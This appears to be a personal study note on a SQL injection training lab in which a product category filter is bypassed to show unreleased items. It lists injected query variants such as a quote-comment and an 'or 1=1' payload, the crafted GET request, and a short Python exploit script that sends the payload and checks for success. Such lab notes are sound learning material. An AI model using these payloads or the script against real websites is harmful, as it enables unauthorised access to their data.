This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

---

**Notes:** 

```sql
SQL injection - product category filter

SELECT * FROM products WHERE category = 'Gifts' AND released = 1 
```

**Goal:** display all products both released and unreleased.

**Analysis:** 

```sql
SELECT * FROM products WHERE category = 'Pets' AND released = 1

SELECT * FROM products WHERE category = ''' AND released = 1 

SELECT * FROM products WHERE category = ''--' AND released = 1 

SELECT * FROM products WHERE category = ''

SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1 
```

---

Script notes:

`GET /filter?category=Corporate+gifts'--`

This changed to: `GET /filter?category=Gifts'--`

![[Pasted image 20240830103324.png]]

```python
#!/usr/bin/python3

import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def unhide(url):
	show_all = url + "/filter?category=Gifts'--"
	r = requests.get(show_all, verify=False, proxies=proxies)
	if 'Lemon' in r.text:
		print('(+) Exploit success!')
		
	else:
		print('(-) Exploit failed.')
	
def main():
	if len(sys.argv) != 2:
		print('(+) Usage: %s <URL>' % sys.argv[0])
		print('(+) Example: %s www.example.com' % sys.argv[0])
		sys.exit(-1)

	url = sys.argv[1]
	unhide(url)

if __name__ == '__main__':
	main()
```

- The options sometimes rotate so you may need to change the `show_all` variable to match up with what category you're using, and you'll need to change what the `if` statement is searching for in the `r.text` to find the new hidden item. 

